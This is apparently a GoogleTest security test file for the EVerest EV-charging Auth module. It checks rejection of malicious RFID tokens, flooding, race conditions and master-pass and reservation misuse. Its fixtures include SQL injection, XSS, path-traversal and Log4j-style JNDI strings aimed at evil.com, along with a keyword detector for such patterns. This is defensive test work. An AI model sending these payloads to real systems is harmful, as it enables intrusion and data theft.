// SPDX-License-Identifier: Apache-2.0
// Copyright Pionix GmbH and Contributors to EVerest

/**
 * @file auth_security_tests.cpp
 * @brief Comprehensive security tests for the EVerest Auth module
 * 
 * This file contains security-focused tests that demonstrate and validate
 * protection against various fraud scenarios and attack vectors including:
 * - Token flooding and DoS attacks
 * - Input validation vulnerabilities
 * - Race condition exploits
 * - Master pass abuse
 * - Reservation fraud
 * - Session hijacking attempts
 * 
 * WARNING: These tests are designed for security assessment and should only
 * be run in controlled test environments.
 * 
 * @author Security Assessment Team
 * @date November 2025
 */

#include <gmock/gmock.h>
#include <gtest/gtest.h>
#include <thread>
#include <chrono>
#include <future>
#include <random>
#include <string>
#include <vector>
#include <atomic>
#include <memory>

#include <AuthHandler.hpp>
#include <FakeAuthReceiver.hpp>
#include <everest/logging.hpp>
#include <utils/date.hpp>

using ::testing::_;
using ::testing::Field;
using ::testing::Invoke;
using ::testing::MockFunction;
using ::testing::StrictMock;
using ::testing::AtLeast;
using ::testing::AtMost;

namespace module {
namespace security_tests {

// Security test constants
const static std::string VALID_SECURITY_TOKEN = "SECURITY_VALID_001";
const static std::string MALICIOUS_TOKEN_SQL = "admin'; DROP TABLE users; --";
const static std::string MALICIOUS_TOKEN_XSS = "<script>alert('XSS')</script>";
const static std::string MALICIOUS_TOKEN_PATH = "../../etc/passwd";
const static std::string LARGE_TOKEN = std::string(10000, 'A'); // 10KB token
const static std::string MASTER_SECURITY_TOKEN = "SECURITY_MASTER_PASS";
const static int32_t SECURITY_CONNECTION_TIMEOUT = 2; // Short timeout for testing

/**
 * @brief Security-focused test fixture for Auth module fraud scenarios
 */
class AuthSecurityTest : public ::testing::Test {
protected:
    std::unique_ptr<AuthHandler> auth_handler;
    std::unique_ptr<FakeAuthReceiver> auth_receiver;
    
    // Mock callbacks for security monitoring
    testing::MockFunction<void(const ProvidedIdToken& token, TokenValidationStatus status)>
        mock_publish_token_validation_status_callback;
    testing::MockFunction<void(const int evse_index, const StopTransactionRequest& request)>
        mock_stop_transaction_callback;
    testing::MockFunction<void(const int evse_index)> 
        mock_withdraw_authorization_callback;
    
    // Security metrics tracking
    std::atomic<int> validation_attempts{0};
    std::atomic<int> rejected_attempts{0};
    std::atomic<int> timeout_events{0};
    std::atomic<int> security_events{0};

    void SetUp() override {
        std::vector<int32_t> evse_indices{0, 1, 2};
        this->auth_receiver = std::make_unique<FakeAuthReceiver>(evse_indices);

        // Initialize with security-focused configuration
        const std::string id = "security_test_auth_handler";
        this->auth_handler = std::make_unique<AuthHandler>(
            SelectionAlgorithm::FindFirst, 
            SECURITY_CONNECTION_TIMEOUT,
            false,  // prioritize_authorization_over_stopping_transaction
            false,  // ignore_connector_faults - security first
            id, 
            nullptr
        );

        // Set up security monitoring callbacks
        this->auth_handler->register_notify_evse_callback(
            [this](const int evse_index, const ProvidedIdToken& provided_token,
                   const ValidationResult& validation_result) {
                if (validation_result.authorization_status == AuthorizationStatus::Accepted) {
                    this->auth_receiver->authorize(evse_index);
                } else {
                    this->auth_receiver->deauthorize(evse_index);
                    this->rejected_attempts++;
                }
            });

        this->auth_handler->register_withdraw_authorization_callback(
            [this](int32_t evse_index) {
                this->auth_receiver->deauthorize(evse_index);
                this->mock_withdraw_authorization_callback.Call(evse_index);
            });

        this->auth_handler->register_stop_transaction_callback(
            [this](int32_t evse_index, const StopTransactionRequest& request) {
                this->auth_receiver->deauthorize(evse_index);
                this->mock_stop_transaction_callback.Call(evse_index, request);
            });

        // Security-aware token validation callback
        this->auth_handler->register_validate_token_callback(
            [this](const ProvidedIdToken& provided_token) -> std::vector<ValidationResult> {
                this->validation_attempts++;
                
                std::vector<ValidationResult> validation_results;
                const auto id_token = provided_token.id_token.value;
                
                ValidationResult result_1;
                result_1.authorization_status = AuthorizationStatus::Invalid;

                ValidationResult result_2;
                
                // Security validation logic
                if (this->is_security_threat(id_token)) {
                    result_2.authorization_status = AuthorizationStatus::Invalid;
                    this->security_events++;
                } else if (this->is_valid_security_token(id_token)) {
                    result_2.authorization_status = AuthorizationStatus::Accepted;
                } else if (id_token == MASTER_SECURITY_TOKEN) {
                    result_2.authorization_status = AuthorizationStatus::Accepted;
                    result_2.parent_id_token = {MASTER_SECURITY_TOKEN, types::authorization::IdTokenType::ISO14443};
                } else {
                    result_2.authorization_status = AuthorizationStatus::Invalid;
                }

                validation_results.push_back(result_1);
                validation_results.push_back(result_2);
                return validation_results;
            });

        this->auth_handler->register_publish_token_validation_status_callback(
            [this](const ProvidedIdToken& token, TokenValidationStatus status) {
                if (status == TokenValidationStatus::TimedOut) {
                    this->timeout_events++;
                }
                this->mock_publish_token_validation_status_callback.Call(token, status);
            });

        // Initialize test EVSEs
        this->auth_handler->init_evse(1, 0, {Connector(1, types::evse_manager::ConnectorTypeEnum::cCCS2)});
        this->auth_handler->init_evse(2, 1, {Connector(1, types::evse_manager::ConnectorTypeEnum::sType2)});
        this->auth_handler->init_evse(3, 2, {Connector(1, types::evse_manager::ConnectorTypeEnum::cCCS2)});
    }

    void TearDown() override {
        // Clean up any active sessions
        SessionEvent event;
        event.event = SessionEventEnum::SessionFinished;
        this->auth_handler->handle_session_event(1, event);
        this->auth_handler->handle_session_event(2, event);
        this->auth_handler->handle_session_event(3, event);
        
        // Log security metrics
        EVLOG_info << "Security Test Metrics:";
        EVLOG_info << "  Validation attempts: " << validation_attempts.load();
        EVLOG_info << "  Rejected attempts: " << rejected_attempts.load();
        EVLOG_info << "  Timeout events: " << timeout_events.load();
        EVLOG_info << "  Security events: " << security_events.load();
    }

private:
    /**
     * @brief Detect potential security threats in token values
     */
    bool is_security_threat(const std::string& token) {
        // SQL injection patterns
        if (token.find("DROP") != std::string::npos || 
            token.find("INSERT") != std::string::npos ||
            token.find("UPDATE") != std::string::npos ||
            token.find("DELETE") != std::string::npos ||
            token.find("';") != std::string::npos) {
            return true;
        }
        
        // XSS patterns
        if (token.find("<script>") != std::string::npos ||
            token.find("javascript:") != std::string::npos ||
            token.find("onload=") != std::string::npos) {
            return true;
        }
        
        // Path traversal patterns
        if (token.find("../") != std::string::npos ||
            token.find("..\\") != std::string::npos ||
            token.find("/etc/") != std::string::npos) {
            return true;
        }
        
        // Oversized tokens (potential buffer overflow)
        if (token.length() > 1000) {
            return true;
        }
        
        return false;
    }

    bool is_valid_security_token(const std::string& token) {
        return token == VALID_SECURITY_TOKEN ||
               token.find("SECURITY_VALID") == 0;
    }

protected:
    /**
     * @brief Helper to create security test tokens
     */
    ProvidedIdToken create_security_token(const std::string& value,
                                        std::optional<std::vector<int32_t>> connectors = std::nullopt) {
        ProvidedIdToken provided_token;
        provided_token.id_token = {value, types::authorization::IdTokenType::ISO14443};
        provided_token.authorization_type = types::authorization::AuthorizationType::RFID;
        if (connectors) {
            provided_token.connectors.emplace(connectors.value());
        }
        return provided_token;
    }

    /**
     * @brief Helper to create session events
     */
    SessionEvent create_session_started_event() {
        SessionEvent session_event;
        session_event.event = SessionEventEnum::SessionStarted;
        SessionStarted session_started;
        session_started.reason = types::evse_manager::StartSessionReason::EVConnected;
        session_event.session_started = session_started;
        return session_event;
    }

    /**
     * @brief Helper to create transaction events
     */
    SessionEvent create_transaction_started_event(const ProvidedIdToken& token) {
        SessionEvent session_event;
        session_event.event = SessionEventEnum::TransactionStarted;
        TransactionStarted transaction_event;
        transaction_event.meter_value.energy_Wh_import.total = 0;
        transaction_event.id_tag = token;
        session_event.timestamp = Everest::Date::to_rfc3339(date::utc_clock::now());
        session_event.transaction_started = transaction_event;
        return session_event;
    }
};

/**
 * @brief Test protection against SQL injection in token values
 */
TEST_F(AuthSecurityTest, test_sql_injection_protection) {
    EVLOG_info << "=== Testing SQL Injection Protection ===";
    
    const SessionEvent session_event = create_session_started_event();
    this->auth_handler->handle_session_event(1, session_event);

    std::vector<int32_t> connectors{1};
    ProvidedIdToken malicious_token = create_security_token(MALICIOUS_TOKEN_SQL, connectors);

    EXPECT_CALL(mock_publish_token_validation_status_callback,
                testing::Field(&ProvidedIdToken::id_token, malicious_token.id_token), 
                TokenValidationStatus::Processing);
    EXPECT_CALL(mock_publish_token_validation_status_callback,
                testing::Field(&ProvidedIdToken::id_token, malicious_token.id_token), 
                TokenValidationStatus::Rejected);

    const auto result = this->auth_handler->on_token(malicious_token);
    
    // SQL injection should be rejected
    ASSERT_EQ(result, TokenHandlingResult::REJECTED);
    ASSERT_FALSE(this->auth_receiver->get_authorization(0));
    ASSERT_GT(this->security_events.load(), 0) << "Security event should have been logged";
}

/**
 * @brief Test protection against XSS attacks in token values
 */
TEST_F(AuthSecurityTest, test_xss_protection) {
    EVLOG_info << "=== Testing XSS Protection ===";
    
    const SessionEvent session_event = create_session_started_event();
    this->auth_handler->handle_session_event(1, session_event);

    std::vector<int32_t> connectors{1};
    ProvidedIdToken xss_token = create_security_token(MALICIOUS_TOKEN_XSS, connectors);

    EXPECT_CALL(mock_publish_token_validation_status_callback, testing::_, testing::_)
        .Times(AtLeast(1));

    const auto result = this->auth_handler->on_token(xss_token);
    
    // XSS attempts should be rejected
    ASSERT_EQ(result, TokenHandlingResult::REJECTED);
    ASSERT_FALSE(this->auth_receiver->get_authorization(0));
}

/**
 * @brief Test protection against path traversal attacks
 */
TEST_F(AuthSecurityTest, test_path_traversal_protection) {
    EVLOG_info << "=== Testing Path Traversal Protection ===";
    
    const SessionEvent session_event = create_session_started_event();
    this->auth_handler->handle_session_event(1, session_event);

    std::vector<int32_t> connectors{1};
    ProvidedIdToken path_token = create_security_token(MALICIOUS_TOKEN_PATH, connectors);

    EXPECT_CALL(mock_publish_token_validation_status_callback, testing::_, testing::_)
        .Times(AtLeast(1));

    const auto result = this->auth_handler->on_token(path_token);
    
    // Path traversal should be rejected
    ASSERT_EQ(result, TokenHandlingResult::REJECTED);
    ASSERT_FALSE(this->auth_receiver->get_authorization(0));
}

/**
 * @brief Test buffer overflow protection with oversized tokens
 */
TEST_F(AuthSecurityTest, test_buffer_overflow_protection) {
    EVLOG_info << "=== Testing Buffer Overflow Protection ===";
    
    const SessionEvent session_event = create_session_started_event();
    this->auth_handler->handle_session_event(1, session_event);

    std::vector<int32_t> connectors{1};
    ProvidedIdToken large_token = create_security_token(LARGE_TOKEN, connectors);

    EXPECT_CALL(mock_publish_token_validation_status_callback, testing::_, testing::_)
        .Times(AtLeast(1));

    auto start_time = std::chrono::high_resolution_clock::now();
    const auto result = this->auth_handler->on_token(large_token);
    auto end_time = std::chrono::high_resolution_clock::now();
    
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time);
    
    // Large tokens should be rejected and processing should be fast
    ASSERT_EQ(result, TokenHandlingResult::REJECTED);
    ASSERT_FALSE(this->auth_receiver->get_authorization(0));
    ASSERT_LT(duration.count(), 1000) << "Processing took too long, potential DoS vulnerability";
}

/**
 * @brief Test token flooding DoS protection
 */
TEST_F(AuthSecurityTest, test_token_flooding_protection) {
    EVLOG_info << "=== Testing Token Flooding Protection ===";
    
    const SessionEvent session_event = create_session_started_event();
    this->auth_handler->handle_session_event(1, session_event);
    this->auth_handler->handle_session_event(2, session_event);
    this->auth_handler->handle_session_event(3, session_event);

    std::vector<int32_t> connectors{1, 2, 3};
    
    // Allow some calls but not all - system should have rate limiting
    EXPECT_CALL(mock_publish_token_validation_status_callback, testing::_, testing::_)
        .Times(AtLeast(10))
        .Times(AtMost(200)); // Should not process all 1000 requests

    const int num_flood_requests = 100; // Reduced for test performance
    std::vector<std::future<TokenHandlingResult>> futures;
    std::vector<std::thread> threads;
    std::vector<TokenHandlingResult> results(num_flood_requests);

    auto start_time = std::chrono::high_resolution_clock::now();

    // Launch flood of token requests
    for (int i = 0; i < num_flood_requests; ++i) {
        std::string token_value = "FLOOD_TOKEN_" + std::to_string(i);
        ProvidedIdToken flood_token = create_security_token(token_value, connectors);
        
        threads.emplace_back([this, flood_token, &results, i]() {
            results[i] = this->auth_handler->on_token(flood_token);
        });
        
        // Small delay to prevent overwhelming the test system
        if (i % 10 == 0) {
            std::this_thread::sleep_for(std::chrono::milliseconds(1));
        }
    }

    // Wait for all requests to complete
    for (auto& t : threads) {
        t.join();
    }

    auto end_time = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time);

    // Count different response types
    int accepted_count = 0, rejected_count = 0, in_process_count = 0, timeout_count = 0;
    for (const auto& result : results) {
        switch (result) {
            case TokenHandlingResult::ACCEPTED:
                accepted_count++;
                break;
            case TokenHandlingResult::REJECTED:
                rejected_count++;
                break;
            case TokenHandlingResult::ALREADY_IN_PROCESS:
                in_process_count++;
                break;
            case TokenHandlingResult::TIMEOUT:
                timeout_count++;
                break;
            default:
                break;
        }
    }

    EVLOG_info << "Flood test results - Accepted: " << accepted_count 
              << ", Rejected: " << rejected_count 
              << ", In Process: " << in_process_count 
              << ", Timeouts: " << timeout_count
              << ", Duration: " << duration.count() << "ms";

    // Security assertions
    ASSERT_LE(accepted_count, 10) << "Too many flood requests were accepted";
    ASSERT_GT(rejected_count + in_process_count, num_flood_requests * 0.8) 
        << "System should reject most flood requests";
    ASSERT_LT(duration.count(), 10000) << "Flood handling took too long";
}

/**
 * @brief Test race condition in concurrent token processing
 */
TEST_F(AuthSecurityTest, test_concurrent_token_race_condition) {
    EVLOG_info << "=== Testing Concurrent Token Race Conditions ===";
    
    const SessionEvent session_event = create_session_started_event();
    this->auth_handler->handle_session_event(1, session_event);

    std::vector<int32_t> connectors{1};
    ProvidedIdToken test_token = create_security_token(VALID_SECURITY_TOKEN, connectors);

    EXPECT_CALL(mock_publish_token_validation_status_callback, testing::_, testing::_)
        .Times(AtLeast(5));

    const int concurrent_requests = 10;
    std::vector<std::future<TokenHandlingResult>> futures;
    std::atomic<bool> start_flag{false};

    // Start multiple concurrent requests for same token
    for (int i = 0; i < concurrent_requests; ++i) {
        auto future = std::async(std::launch::async, [this, test_token, &start_flag]() {
            // Wait for all threads to be ready
            while (!start_flag.load()) {
                std::this_thread::sleep_for(std::chrono::microseconds(1));
            }
            return this->auth_handler->on_token(test_token);
        });
        futures.push_back(std::move(future));
    }

    // Start all requests simultaneously
    start_flag = true;

    // Collect results
    std::vector<TokenHandlingResult> results;
    for (auto& future : futures) {
        results.push_back(future.get());
    }

    // Count results
    int accepted_count = 0, in_process_count = 0;
    for (const auto& result : results) {
        if (result == TokenHandlingResult::ACCEPTED) {
            accepted_count++;
        } else if (result == TokenHandlingResult::ALREADY_IN_PROCESS) {
            in_process_count++;
        }
    }

    // Should have protection against race conditions
    ASSERT_LE(accepted_count, 1) << "Multiple concurrent requests should not all be accepted";
    ASSERT_GT(in_process_count, 0) << "Should detect concurrent processing";
}

/**
 * @brief Test master pass security and abuse prevention
 */
TEST_F(AuthSecurityTest, test_master_pass_security) {
    EVLOG_info << "=== Testing Master Pass Security ===";
    
    // Set up master pass
    this->auth_handler->set_master_pass_group_id(MASTER_SECURITY_TOKEN);
    
    const SessionEvent session_event = create_session_started_event();
    this->auth_handler->handle_session_event(1, session_event);
    this->auth_handler->handle_session_event(2, session_event);

    // Start legitimate transactions
    std::vector<int32_t> connectors{1, 2};
    ProvidedIdToken legit_token1 = create_security_token("SECURITY_VALID_USER1", connectors);
    ProvidedIdToken legit_token2 = create_security_token("SECURITY_VALID_USER2", connectors);

    EXPECT_CALL(mock_publish_token_validation_status_callback, testing::_, testing::_)
        .Times(AtLeast(4));
    EXPECT_CALL(mock_stop_transaction_callback, testing::_, testing::_)
        .Times(AtLeast(1));

    // Start transactions
    auto result1 = this->auth_handler->on_token(legit_token1);
    auto result2 = this->auth_handler->on_token(legit_token2);
    
    ASSERT_EQ(result1, TokenHandlingResult::ACCEPTED);
    ASSERT_EQ(result2, TokenHandlingResult::ACCEPTED);

    // Start the transactions
    auto trans_event1 = create_transaction_started_event(legit_token1);
    auto trans_event2 = create_transaction_started_event(legit_token2);
    this->auth_handler->handle_session_event(1, trans_event1);
    this->auth_handler->handle_session_event(2, trans_event2);

    // Now use master pass - should stop transactions
    ProvidedIdToken master_token = create_security_token(MASTER_SECURITY_TOKEN, connectors);
    auto master_result = this->auth_handler->on_token(master_token);

    // Master pass should stop transactions but not start new ones
    ASSERT_EQ(master_result, TokenHandlingResult::USED_TO_STOP_TRANSACTION);
    
    // Verify transactions were stopped
    ASSERT_FALSE(this->auth_receiver->get_authorization(0));
    ASSERT_FALSE(this->auth_receiver->get_authorization(1));

    // Master pass should not be allowed to start new transactions
    this->auth_receiver->reset();
    this->auth_handler->handle_session_event(3, session_event);
    
    std::vector<int32_t> connector3{3};
    ProvidedIdToken master_start_attempt = create_security_token(MASTER_SECURITY_TOKEN, connector3);
    auto start_result = this->auth_handler->on_token(master_start_attempt);
    
    ASSERT_EQ(start_result, TokenHandlingResult::REJECTED) 
        << "Master pass should not be allowed to start transactions";
}

/**
 * @brief Test reservation fraud protection
 */
TEST_F(AuthSecurityTest, test_reservation_fraud_protection) {
    EVLOG_info << "=== Testing Reservation Fraud Protection ===";
    
    // Create multiple reservations rapidly (reservation bombing)
    const int max_reservations = 20;
    int successful_reservations = 0;
    int failed_reservations = 0;

    for (int i = 0; i < max_reservations; ++i) {
        Reservation reservation;
        reservation.evse_id = (i % 3) + 1; // Rotate through EVSEs
        reservation.id_token = "BOMB_TOKEN_" + std::to_string(i);
        reservation.reservation_id = 1000 + i;
        reservation.connector_type = types::evse_manager::ConnectorTypeEnum::cCCS2;
        reservation.expiry_time = Everest::Date::to_rfc3339(
            date::utc_clock::now() + std::chrono::hours(1));

        auto result = this->auth_handler->handle_reservation(reservation);
        if (result == ReservationResult::Accepted) {
            successful_reservations++;
        } else {
            failed_reservations++;
        }
        
        // Break if we hit conflicts (expected protection)
        if (failed_reservations > 5) {
            break;
        }
    }

    EVLOG_info << "Reservation bombing - Successful: " << successful_reservations 
              << ", Failed: " << failed_reservations;

    // Should have limits on reservation creation
    ASSERT_LT(successful_reservations, max_reservations) 
        << "System should limit excessive reservations";
    ASSERT_GT(failed_reservations, 0) 
        << "System should reject some reservation bomb attempts";

    // Test reservation with malicious token
    Reservation malicious_reservation;
    malicious_reservation.evse_id = 1;
    malicious_reservation.id_token = MALICIOUS_TOKEN_SQL;
    malicious_reservation.reservation_id = 9999;
    malicious_reservation.connector_type = types::evse_manager::ConnectorTypeEnum::cCCS2;
    malicious_reservation.expiry_time = Everest::Date::to_rfc3339(
        date::utc_clock::now() + std::chrono::hours(1));

    auto malicious_result = this->auth_handler->handle_reservation(malicious_reservation);
    
    // Malicious reservations should be rejected
    ASSERT_NE(malicious_result, ReservationResult::Accepted) 
        << "Malicious reservation tokens should be rejected";
}

/**
 * @brief Test unauthorized transaction stopping
 */
TEST_F(AuthSecurityTest, test_unauthorized_transaction_stop) {
    EVLOG_info << "=== Testing Unauthorized Transaction Stop Protection ===";
    
    const SessionEvent session_event = create_session_started_event();
    this->auth_handler->handle_session_event(1, session_event);

    std::vector<int32_t> connectors{1};
    ProvidedIdToken victim_token = create_security_token("SECURITY_VALID_VICTIM", connectors);
    ProvidedIdToken attacker_token = create_security_token("SECURITY_VALID_ATTACKER", connectors);

    EXPECT_CALL(mock_publish_token_validation_status_callback, testing::_, testing::_)
        .Times(AtLeast(3));

    // Victim starts transaction
    auto victim_result = this->auth_handler->on_token(victim_token);
    ASSERT_EQ(victim_result, TokenHandlingResult::ACCEPTED);

    auto trans_event = create_transaction_started_event(victim_token);
    this->auth_handler->handle_session_event(1, trans_event);
    ASSERT_TRUE(this->auth_receiver->get_authorization(0));

    // Attacker tries to stop victim's transaction
    auto attacker_result = this->auth_handler->on_token(attacker_token);
    
    // Attacker should not be able to stop victim's transaction
    ASSERT_NE(attacker_result, TokenHandlingResult::USED_TO_STOP_TRANSACTION) 
        << "Attacker should not be able to stop another user's transaction";
    ASSERT_TRUE(this->auth_receiver->get_authorization(0)) 
        << "Victim's transaction should still be active";
}

/**
 * @brief Test session timeout security
 */
TEST_F(AuthSecurityTest, test_session_timeout_security) {
    EVLOG_info << "=== Testing Session Timeout Security ===";
    
    std::vector<int32_t> connectors{1, 2};
    ProvidedIdToken test_token = create_security_token(VALID_SECURITY_TOKEN, connectors);

    EXPECT_CALL(mock_publish_token_validation_status_callback, testing::_, testing::_)
        .Times(AtLeast(3));

    // Start token processing but don't plug in
    auto start_time = std::chrono::high_resolution_clock::now();
    auto result = this->auth_handler->on_token(test_token);
    auto end_time = std::chrono::high_resolution_clock::now();

    auto duration = std::chrono::duration_cast<std::chrono::seconds>(end_time - start_time);

    // Should timeout within reasonable time
    ASSERT_EQ(result, TokenHandlingResult::TIMEOUT);
    ASSERT_LE(duration.count(), SECURITY_CONNECTION_TIMEOUT + 1) 
        << "Timeout should occur within expected timeframe";
    ASSERT_GT(this->timeout_events.load(), 0) << "Timeout event should be logged";

    // After timeout, no authorization should be granted
    ASSERT_FALSE(this->auth_receiver->get_authorization(0));
    ASSERT_FALSE(this->auth_receiver->get_authorization(1));
}

/**
 * @brief Test input validation edge cases
 */
TEST_F(AuthSecurityTest, test_input_validation_edge_cases) {
    EVLOG_info << "=== Testing Input Validation Edge Cases ===";
    
    const SessionEvent session_event = create_session_started_event();
    this->auth_handler->handle_session_event(1, session_event);

    std::vector<int32_t> connectors{1};

    // Test various malicious inputs
    std::vector<std::string> malicious_inputs = {
        "", // Empty string
        std::string(1, '\0'), // Null character
        "token\nwith\nnewlines", // Newline injection
        "token\rwith\rcarriage", // Carriage return
        "token\twith\ttabs", // Tab characters
        "正常なトークン", // Unicode characters
        std::string(1000, 'X'), // Large input
        "LDAP://evil.com/payload", // LDAP injection
        "${jndi:ldap://evil.com}", // Log4j style injection
    };

    EXPECT_CALL(mock_publish_token_validation_status_callback, testing::_, testing::_)
        .Times(AtLeast(malicious_inputs.size()));

    int rejected_count = 0;
    for (const auto& malicious_input : malicious_inputs) {
        try {
            ProvidedIdToken malicious_token = create_security_token(malicious_input, connectors);
            auto result = this->auth_handler->on_token(malicious_token);
            
            if (result == TokenHandlingResult::REJECTED) {
                rejected_count++;
            }
            
            // Should not authorize malicious inputs
            ASSERT_FALSE(this->auth_receiver->get_authorization(0)) 
                << "Malicious input should not be authorized: " << malicious_input;
                
        } catch (const std::exception& e) {
            // Exceptions are also acceptable for malicious inputs
            EVLOG_warning << "Exception handling malicious input '" << malicious_input << "': " << e.what();
            rejected_count++; // Count exceptions as rejections
        }
    }

    // Most malicious inputs should be rejected
    ASSERT_GE(rejected_count, malicious_inputs.size() * 0.7) 
        << "Most malicious inputs should be rejected or cause exceptions";
}

/**
 * @brief Test withdrawal attack protection
 */
TEST_F(AuthSecurityTest, test_withdrawal_attack_protection) {
    EVLOG_info << "=== Testing Withdrawal Attack Protection ===";
    
    const SessionEvent session_event = create_session_started_event();
    this->auth_handler->handle_session_event(1, session_event);

    std::vector<int32_t> connectors{1};
    ProvidedIdToken victim_token = create_security_token("SECURITY_VALID_VICTIM", connectors);

    EXPECT_CALL(mock_publish_token_validation_status_callback, testing::_, testing::_)
        .Times(AtLeast(1));
    EXPECT_CALL(mock_withdraw_authorization_callback, testing::_)
        .Times(AtMost(1)); // Should only allow legitimate withdrawals

    // Victim gets authorization
    auto result = this->auth_handler->on_token(victim_token);
    ASSERT_EQ(result, TokenHandlingResult::ACCEPTED);

    // Multiple rapid withdrawal attempts (potential DoS)
    const int withdrawal_attempts = 10;
    int successful_withdrawals = 0;
    int failed_withdrawals = 0;

    for (int i = 0; i < withdrawal_attempts; ++i) {
        types::authorization::WithdrawAuthorizationRequest withdraw_request;
        withdraw_request.evse_id = 1;
        
        auto withdraw_result = this->auth_handler->handle_withdraw_authorization(withdraw_request);
        
        if (withdraw_result == WithdrawAuthorizationResult::Accepted) {
            successful_withdrawals++;
        } else {
            failed_withdrawals++;
        }
    }

    EVLOG_info << "Withdrawal attempts - Successful: " << successful_withdrawals 
              << ", Failed: " << failed_withdrawals;

    // Should limit repeated withdrawal attempts
    ASSERT_LE(successful_withdrawals, 1) << "Should not allow multiple withdrawals of same authorization";
    ASSERT_GT(failed_withdrawals, withdrawal_attempts - 2) << "Most withdrawal attempts should fail";
}

/**
 * @brief Performance test under security load
 */
TEST_F(AuthSecurityTest, test_performance_under_security_load) {
    EVLOG_info << "=== Testing Performance Under Security Load ===";
    
    const int num_evses = 3;
    for (int i = 1; i <= num_evses; ++i) {
        const SessionEvent session_event = create_session_started_event();
        this->auth_handler->handle_session_event(i, session_event);
    }

    // Allow reasonable number of callbacks
    EXPECT_CALL(mock_publish_token_validation_status_callback, testing::_, testing::_)
        .Times(AtLeast(20))
        .Times(AtMost(100));

    const int mixed_load_requests = 50; // Reduced for test performance
    std::vector<std::thread> threads;
    std::atomic<int> completed_requests{0};

    auto start_time = std::chrono::high_resolution_clock::now();

    // Mix of legitimate and malicious requests
    for (int i = 0; i < mixed_load_requests; ++i) {
        threads.emplace_back([this, i, &completed_requests]() {
            std::vector<int32_t> connectors{1, 2, 3};
            
            ProvidedIdToken token;
            if (i % 5 == 0) {
                // 20% malicious requests
                std::vector<std::string> malicious_tokens = {
                    MALICIOUS_TOKEN_SQL, MALICIOUS_TOKEN_XSS, MALICIOUS_TOKEN_PATH
                };
                token = create_security_token(malicious_tokens[i % 3], connectors);
            } else {
                // 80% legitimate requests
                token = create_security_token("SECURITY_VALID_" + std::to_string(i), connectors);
            }
            
            this->auth_handler->on_token(token);
            completed_requests++;
        });
        
        // Controlled rate to prevent overwhelming test system
        if (i % 5 == 0) {
            std::this_thread::sleep_for(std::chrono::milliseconds(1));
        }
    }

    // Wait for completion
    for (auto& t : threads) {
        t.join();
    }

    auto end_time = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time);

    EVLOG_info << "Mixed security load test completed: " << completed_requests.load() 
              << " requests in " << duration.count() << "ms";
    EVLOG_info << "Average processing time: " << (duration.count() / static_cast<double>(mixed_load_requests)) << "ms per request";

    // Performance assertions
    ASSERT_EQ(completed_requests.load(), mixed_load_requests) << "All requests should complete";
    ASSERT_LT(duration.count(), 30000) << "Mixed load should complete within reasonable time"; // 30 seconds
    ASSERT_GT(this->security_events.load(), 0) << "Should detect security threats in mixed load";
}

} // namespace security_tests
} // namespace module